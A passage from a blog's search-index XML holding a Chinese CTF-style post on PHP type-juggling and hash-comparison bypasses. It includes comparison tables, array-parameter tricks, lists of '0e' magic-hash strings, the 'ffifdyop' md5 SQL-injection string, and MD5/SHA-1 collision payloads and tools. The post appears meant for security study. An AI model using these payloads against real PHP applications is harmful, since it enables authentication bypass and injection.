align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td></tr><tr><td align="left"><em>“0”</em></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td></tr><tr><td align="left"><em>“-1”</em></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td></tr><tr><td align="left"><strong><code>NULL</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td></tr><tr><td align="left"><em>array()</em></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td></tr><tr><td align="left"><em>“php”</em></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td></tr><tr><td align="left"><em>“”</em></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td></tr></tbody></table><h3 id="严格比较"><a href="#严格比较" class="headerlink" title="严格比较 (&#x3D;&#x3D;&#x3D;)"></a>严格比较 (&#x3D;&#x3D;&#x3D;)</h3><table><thead><tr><th align="left"></th><th align="left"><strong><code>FALSE</code></strong></th><th align="left"><em>1</em></th><th align="left"><em>0</em></th><th align="left"><em>-1</em></th><th align="left"><em>“1”</em></th><th align="left"><em>“0”</em></th><th align="left"><em>“-1”</em></th><th align="left"><strong><code>NULL</code></strong></th><th align="left"><em>array()</em></th><th align="left"><em>“php”</em></th><th align="left"><em>“”</em></th></tr></thead><tbody><tr><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td></tr><tr><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td></tr><tr><td align="left"><em>1</em></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td></tr><tr><td align="left"><em>0</em></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td></tr><tr><td align="left"><em>-1</em></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td></tr><tr><td align="left"><em>“1”</em></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td></tr><tr><td align="left"><em>“0”</em></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td></tr><tr><td align="left"><em>“-1”</em></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td></tr><tr><td align="left"><strong><code>NULL</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td></tr><tr><td align="left"><em>array()</em></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td></tr><tr><td align="left"><em>“php”</em></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td></tr><tr><td align="left"><em>“”</em></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td></tr></tbody></table><h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><h3 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h3><p>对于php强比较和弱比较：md5()，sha1()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL，也就是相等的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$a</span>!==<span class="variable">$b</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>)===<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>))&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;hahaha&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a[]=1&amp;b[]=2</span><br></pre></td></tr></table></figure><h3 id="0e绕过弱比较"><a href="#0e绕过弱比较" class="headerlink" title="0e绕过弱比较"></a>0e绕过弱比较</h3><p>对于某些特殊的字符串加密后得到的密文以0e开头，PHP会当作科学计数法来处理，也就是0的n次方，得到的值比较的时候都相同</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$a</span>!==<span class="variable">$b</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>)==<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>))&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;hahaha&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>md5</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">240610708:0e462097431906509019562988736854</span><br><span class="line">QLTHNDT:0e405967825401955372549139051580</span><br><span class="line">QNKCDZO:0e830400451993494058024219903391</span><br><span class="line">PJNPDWY:0e291529052894702774557631701704</span><br><span class="line">NWWKITQ:0e763082070976038347657360817689</span><br><span class="line">NOOPCJF:0e818888003657176127862245791911</span><br><span class="line">MMHUWUV:0e701732711630150438129209816536</span><br><span class="line">MAUXXQC:0e478478466848439040434801845361</span><br></pre></td></tr></table></figure><p><strong>sha1</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">10932435112: 0e07766915004133176347055865026311692244</span><br><span class="line">aaroZmOk: 0e66507019969427134894567494305185566735</span><br><span class="line">aaK1STfY: 0e76658526655756207688271159624026011393</span><br><span class="line">aaO8zKZF: 0e89257456677279068558073954252716165668</span><br><span class="line">aa3OFF9m: 0e36977786278517984959260394024281014729</span><br><span class="line">0e1290633704: 0e19985187802402577070739524195726831799</span><br></pre></td></tr></table></figure><h3 id="md5-md5-a-0e绕过"><a href="#md5-md5-a-0e绕过" class="headerlink" title="md5(md5($a))0e绕过"></a>md5(md5($a))0e绕过</h3><p>以下字符串进行两次md5后以0e开头</p><p>7r4lGXCH2Ksu2JNT3BYM<br>CbDLytmyGm2xQyaLNhWn<br>770hQgrBOjrcqftrlaZk</p><h3 id="a-md5-a"><a href="#a-md5-a" class="headerlink" title="$a&#x3D;&#x3D;md5($a)"></a>$a&#x3D;&#x3D;md5($a)</h3><p>0e215962017 的 MD5 值也是由 0e 开头，在 PHP 弱类型比较中相等</p><h3 id="md5绕过SQL"><a href="#md5绕过SQL" class="headerlink" title="md5绕过SQL"></a>md5绕过SQL</h3><p><code>ffifdyop</code>，经过md5函数后结果为 ‘or’6\xc9]\x99\xe9!r,\xf9\xedb\x1c；</p><p>129581926211651571912466741651878684928，经过md5函数后结果为 \x06\xdaT0D\x9f\x8fo#\xdf\xc1’or’8；</p><h3 id="NaN-和-INF"><a href="#NaN-和-INF" class="headerlink" title="NaN 和 INF"></a>NaN 和 INF</h3><p>NAN和INF，分别为非数字和无穷大，但是var_dump一下它们的数据类型却是double，那么在md5函数处理它们的时候，是将其直接转换为字符串”NAN”和字符串”INF”使用的，但是它们拥有特殊的性质，它们与任何数据类型（除了true）做强类型或弱类型比较均为false，甚至NaN&#x3D;&#x3D;&#x3D;NaN都是false，但md5(‘NaN’)&#x3D;&#x3D;&#x3D;md5(‘NaN’)为true。</p><h3 id="md5-和-sha1碰撞"><a href="#md5-和-sha1碰撞" class="headerlink" title="md5 和 sha1碰撞"></a>md5 和 sha1碰撞</h3><p>使用碰撞可以绕过不同字符串，相同md5&#x2F;sha1的强比较</p><h3 id="MD5碰撞"><a href="#MD5碰撞" class="headerlink" title="MD5碰撞"></a><strong>MD5碰撞</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2   </span><br><span class="line">b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2   </span><br><span class="line"></span><br><span class="line">a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</span><br><span class="line">b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%</span><br><span class="line"></span><br><span class="line">a=&quot;\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x00\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\x55\x5d\x83\x60\xfb\x5f\x07\xfe\xa2&quot;;</span><br><span class="line">b=&quot;\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x02\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\xd5\x5d\x83\x60\xfb\x5f\x07\xfe\xa2&quot;;</span><br></pre></td></tr></table></figure><p><strong>linux</strong></p><p>使用md5collgen碰撞生成两个md5值相同但内容不同的文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5collgen -o 1.bin 2.bin</span><br></pre></td></tr></table></figure><p><strong>windows</strong></p><p>可以下载fastcoll，碰撞生成两个md5值相同但内容不同的文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastcoll.exe -p 123.txt -o 1.txt 2.txt</span><br></pre></td></tr></table></figure><p><strong>sha1 碰撞</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1</span><br><span class="line">b=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Php </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hash </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2022/12/31/hello/"/>
      <url>/2022/12/31/hello/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
